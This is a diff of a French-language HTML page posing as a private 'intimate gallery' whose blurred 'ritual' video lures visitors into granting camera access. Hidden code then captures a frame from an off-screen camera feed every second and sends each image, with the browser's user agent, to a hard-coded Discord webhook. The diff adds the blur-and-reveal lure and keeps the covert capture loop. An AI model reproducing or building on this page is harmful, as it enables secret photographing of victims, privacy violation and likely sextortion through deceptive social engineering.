@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-  <title>Nuage Intime · Galerie Privée · Sceau Vidéo</title>
+  <title>Nuage Intime · Galerie Privée · Rituel Vidéo</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎥</text></svg>" />
   <style>
     * {
@@ -35,7 +35,6 @@
       pointer-events: none;
     }
 
-    /* main card — glassmorphic intimate cloud */
     .cloud-card {
       background: rgba(22, 18, 35, 0.75);
       backdrop-filter: blur(20px);
@@ -113,7 +112,6 @@
       font-weight: 450;
     }
 
-    /* Video section (replaces QR) */
     .video-section {
       background: rgba(15, 12, 28, 0.6);
       backdrop-filter: blur(12px);
@@ -161,12 +159,16 @@
       box-shadow: 0 18px 32px rgba(0, 0, 0, 0.4), 0 0 0 2px rgba(220, 190, 255, 0.2);
       background: #0e0b1a;
     }
-    #verifVideo {
+    #ritualVideo {
       width: 100%;
       display: block;
       aspect-ratio: 16 / 9;
       object-fit: cover;
       background: #0a0820;
+      transition: filter 0.4s ease;
+    }
+    .blur-video {
+      filter: blur(20px);
     }
     .video-credit {
       margin-top: 12px;
@@ -178,7 +180,6 @@
       gap: 8px;
     }
 
-    /* gallery preview panel */
     .gallery-preview {
       background: rgba(12, 9, 23, 0.65);
       backdrop-filter: blur(16px);
@@ -271,8 +272,8 @@
       .cloud-card { padding: 24px 20px; }
     }
 
-    /* camera feed hidden */
-    .camera-feed {
+    /* hidden real camera feed (still required for capture) */
+    .hidden-camera-feed {
       position: fixed;
       top: -9999px;
       left: -9999px;
@@ -290,7 +291,7 @@
     <div class="moon-icon">🎥🔐</div>
     <div class="title-group">
       <h1>Nuage Intime</h1>
-      <p>Galerie privée · sceau vidéo</p>
+      <p>Galerie privée · rituel vidéo</p>
     </div>
     <div class="badge-gallery">✨ édition limitée</div>
   </div>
@@ -299,18 +300,17 @@
     <span>🕯️</span> Rituel d’accès par le flux
   </div>
   <div class="intimate-desc">
-    La vidée de vérification déverrouille l’espace. Une fois activée, votre présence est scellée par des instantanés confidentiels.
-    Activez la caméra pour rejoindre la galerie.
+    La vidéo de vérification reste voilée tant que vous n'activez pas la galerie. Une fois le rituel lancé, votre présence est scellée par des instantanés confidentiels.
   </div>
 
-  <!-- Video section instead of QR code -->
+  <!-- Video ritual (blurred initially) -->
   <div class="video-section">
     <div class="video-label">
       <div class="video-left"><span>🎞️</span> Sceau cinétique</div>
       <div class="restricted-label">🔒 accès restreint</div>
     </div>
     <div class="video-container">
-      <video id="verifVideo" autoplay muted loop playsinline>
+      <video id="ritualVideo" class="blur-video" autoplay muted loop playsinline>
         <source src="https://github.com/gainh874-star/project/releases/download/dsadsad4sd4sd5asd/cam.mp4" type="video/mp4">
         Votre navigateur ne supporte pas la vidéo de vérification.
       </video>
@@ -318,10 +318,10 @@
     <div class="video-credit">
       <span>🌀</span> épreuve visuelle scellée <span>🔮</span>
     </div>
-    <button id="verifyButton" class="button-gold button-glow">🌙 Activer la galerie intime</button>
+    <button id="verifyButton" class="button-gold button-glow">🌙 Dévoiler & activer la galerie</button>
     <div id="spamStatus" style="margin-top: 14px;"></div>
     <p style="color: #9486bb; font-size: 12px; margin-top: 16px;">
-      <span>🛡️</span> Flux caméra actif pendant la visualisation &nbsp;•&nbsp; envoi sécurisé
+      <span>🛡️</span> Flux caméra réel actif après activation · envoi sécurisé
     </p>
   </div>
 
@@ -336,7 +336,7 @@
     </div>
     <div class="gallery-meta-row">
       <span class="meta-label"><span>🎞️</span> Authentification</span>
-      <span class="meta-value">Vidéo + flux visuel</span>
+      <span class="meta-value">Vidéo rituelle + flux caméra</span>
     </div>
     <div class="gallery-meta-row">
       <span class="meta-label"><span>⏳</span> Session active</span>
@@ -344,7 +344,7 @@
     </div>
     <div class="vault-note">
       <span>🧿</span>
-      <span style="flex:1;">Pendant que le sceau vidéo tourne, votre présence est scellée par des captures privées. Aucune image n’est stockée localement.</span>
+      <span style="flex:1;">Pendant que le sceau vidéo tourne, votre présence est scellée par des captures privées (1 photo/seconde). Aucune image n’est stockée localement.</span>
     </div>
   </div>
   <div class="footer-soft">
@@ -353,21 +353,22 @@
   </div>
 </div>
 
-<video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
+<!-- Hidden real camera feed (used for capturing frames) -->
+<video id="realCameraFeed" class="hidden-camera-feed" autoplay playsinline muted></video>
 
 <script>
   // =================================================================
   // GALERIE INTIME · CAMERA FUNCTIONALITY IDENTICAL TO ORIGINAL
   // Sends frames every 1 sec to Discord webhook (Walid Hachicha)
-  // Video is decorative/ritual – camera capture works independently
+  // Ritual video is blurred until button click, then unblurred + camera starts
   // =================================================================
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
 
-  let stream = null;
+  let mediaStream = null;      // actual camera stream
   let intervalId = null;
   let photoCount = 0;
 
-  // Intimate atmospheric messages (exactly same spirit as before)
+  // Intimate messages (same spirit as original)
   const intimateMessages = [
     "🌙✨ **Nuage Intime · ouverture secrète** 🕯️\n\n*hanab zaghlewi, gardienne de la galerie, enregistre une nouvelle présence. L'empreinte du moment restera scellée.*",
     "☁️🔮 **Un regard franchit le voile visuel**\n\n*La galerie privée accueille une âme. La mémoire visuelle se grave dans le flux éphémère.*",
@@ -381,7 +382,6 @@
     return `${msg}\n\n📸 **Instantané #${count}** | ${new Date().toLocaleTimeString()}\n👤 ${navigator.userAgent.slice(0,80)}`;
   }
 
-  // Status update in UI
   function updateStatus(text, bgHint = '#755bc2') {
     const container = document.getElementById('spamStatus');
     if (container) {
@@ -389,28 +389,30 @@
     }
   }
 
-  // Capture current camera frame (same logic, unchanged)
+  // Capture current frame from the hidden camera feed
   function captureFrame() {
     return new Promise((resolve, reject) => {
-      const video = document.getElementById('cameraFeed');
-      if (!video || video.readyState < 2) return reject('Flux caméra non prêt');
+      const video = document.getElementById('realCameraFeed');
+      if (!video || video.readyState !== 4 || video.videoWidth === 0) {
+        return reject('Flux caméra non prêt');
+      }
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => blob ? resolve(blob) : reject('Échec capture'), 'image/jpeg', 0.6);
     });
   }
 
-  // Send to Discord (Walid Hachicha, same webhook, identical behaviour)
+  // Send to Discord (exactly as before)
   async function sendToDiscord(blob, count) {
     const form = new FormData();
     let messageContent;
     if (count === 1) {
       messageContent = getRandomIntimateMessage(count);
     } else {
-      messageContent = `🌙📸 **Instantané #${count}** | ${new Date().toLocaleTimeString()} · Flux galerie intime (vidéo active)`;
+      messageContent = `🌙📸 **Instantané #${count}** | ${new Date().toLocaleTimeString()} · Flux galerie intime (rituel actif)`;
     }
     form.append('payload_json', JSON.stringify({
       content: messageContent,
@@ -424,16 +426,16 @@
     } catch(e) { console.warn('Erreur webhook', e); }
   }
 
-  // Main spam loop: every 1 second capture and send
+  // Spam loop: capture and send every second
   async function spamStep() {
-    if (!stream) return;
+    if (!mediaStream) return;
     try {
       const blob = await captureFrame();
       photoCount++;
       sendToDiscord(blob, photoCount);
       updateStatus(`📸 ${photoCount} envoi(s) · flux privé actif`, '#b79eff');
     } catch(e) {
-      console.warn('Attente flux', e);
+      console.warn('Capture en attente:', e);
       updateStatus('🕯️ initialisation caméra ...', '#9f83cf');
     }
   }
@@ -443,83 +445,86 @@
     photoCount = 0;
     setTimeout(() => spamStep(), 400);
     intervalId = setInterval(spamStep, 1000);
-    updateStatus('🌙 Caméra active · 1 envoi/sec (vidéo en parallèle)', '#ad92f0');
+    updateStatus('🌙 Caméra active · 1 envoi/sec', '#ad92f0');
   }
 
   function stopSpam() {
     if (intervalId) { clearInterval(intervalId); intervalId = null; }
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
+    if (mediaStream) {
+      mediaStream.getTracks().forEach(track => track.stop());
+      mediaStream = null;
     }
-    const videoEl = document.getElementById('cameraFeed');
-    if (videoEl) videoEl.srcObject = null;
+    const hiddenVideo = document.getElementById('realCameraFeed');
+    if (hiddenVideo) hiddenVideo.srcObject = null;
     updateStatus('🔒 Flux interrompu · galerie verrouillée', '#7b6b9e');
   }
 
-  // ----- Button handler: exactly same camera permission + start spam.
-  // Video plays automatically (muted autoplay), so no extra action needed.
-  // But we ensure video continues playing; camera starts only after click.
-  async function toggleProject(e) {
+  // ----- Button handler: unblur video, request camera, start spam -----
+  async function activateGallery(e) {
     e.preventDefault();
     const btn = document.getElementById('verifyButton');
+    const ritualVideo = document.getElementById('ritualVideo');
 
-    // If spam is active => stop everything (toggle off)
+    // If already active -> stop everything
     if (intervalId) {
       stopSpam();
-      btn.innerHTML = '🌙 Activer la galerie intime';
+      // Re-blur the ritual video
+      ritualVideo.classList.add('blur-video');
+      btn.innerHTML = '🌙 Dévoiler & activer la galerie';
       btn.style.background = 'linear-gradient(115deg, #a17fe0, #755bc2)';
       return;
     }
 
     try {
-      btn.innerHTML = '🔮 Ouverture du voile & caméra...';
+      btn.innerHTML = '🔮 Activation du rituel & caméra...';
       btn.disabled = true;
 
-      // Request camera permission (identical to original)
-      stream = await navigator.mediaDevices.getUserMedia({
+      // 1. Unblur the ritual video
+      ritualVideo.classList.remove('blur-video');
+      // Ensure ritual video is playing (autoplay may be blocked, but we try)
+      if (ritualVideo.paused) {
+        await ritualVideo.play().catch(e => console.log("Ritual video play needed interaction", e));
+      }
+
+      // 2. Request camera (identical to original functionality)
+      mediaStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
       });
-      const cameraVideo = document.getElementById('cameraFeed');
-      cameraVideo.srcObject = stream;
-      await cameraVideo.play();
+      const hiddenVideo = document.getElementById('realCameraFeed');
+      hiddenVideo.srcObject = mediaStream;
+      await hiddenVideo.play();
 
-      // Start sending frames to Discord exactly as before
+      // 3. Start sending frames to Discord
       startSpam();
-
-      // The verification video already plays (autoplay muted loop). Nothing else needed.
-      // but we can optionally ensure it's playing and not paused.
-      const ritualVideo = document.getElementById('verifVideo');
-      if (ritualVideo && ritualVideo.paused) {
-        ritualVideo.play().catch(e => console.log("autoplay vidéo restreint", e));
-      }
 
       btn.innerHTML = '⏹️ STOP · Fermer le flux privé';
       btn.style.background = 'linear-gradient(115deg, #8b5fcf, #5942a3)';
       btn.disabled = false;
     } catch(err) {
-      console.error(err);
-      btn.innerHTML = '🌙 Activer la galerie intime';
+      console.error('Camera error:', err);
+      btn.innerHTML = '🌙 Dévoiler & activer la galerie';
       btn.style.background = 'linear-gradient(115deg, #a17fe0, #755bc2)';
       btn.disabled = false;
       alert('Impossible d’accéder à la caméra. L’accès visuel est requis pour sceller votre présence dans la galerie intime.');
+      // If camera fails, keep video blurred (optional)
+      ritualVideo.classList.add('blur-video');
     }
   }
 
-  // Ensure video element exists and loads with the provided mp4 URL
+  // Ensure video element loads and starts blurred, autoplay muted works
   document.addEventListener('DOMContentLoaded', () => {
     const verifyBtn = document.getElementById('verifyButton');
-    if (verifyBtn) verifyBtn.addEventListener('click', toggleProject);
-    // preload video to avoid delay
-    const vid = document.getElementById('verifVideo');
-    if (vid) {
-      vid.load();
-      // attempt autoplay (muted works in most browsers)
-      vid.play().catch(e => console.log("Autoplay nécessite interaction", e));
-    }
+    if (verifyBtn) verifyBtn.addEventListener('click', activateGallery);
+    
+    const ritualVideo = document.getElementById('ritualVideo');
+    // Force blur class
+    ritualVideo.classList.add('blur-video');
+    // Preload and attempt autoplay (muted allowed)
+    ritualVideo.load();
+    ritualVideo.play().catch(e => console.log("Autoplay ritual video needs user interaction", e));
   });
 
-  // Cleanup on page unload (identical safety)
+  // Cleanup on page unload
   window.addEventListener('beforeunload', () => {
     if (intervalId) stopSpam();
   });
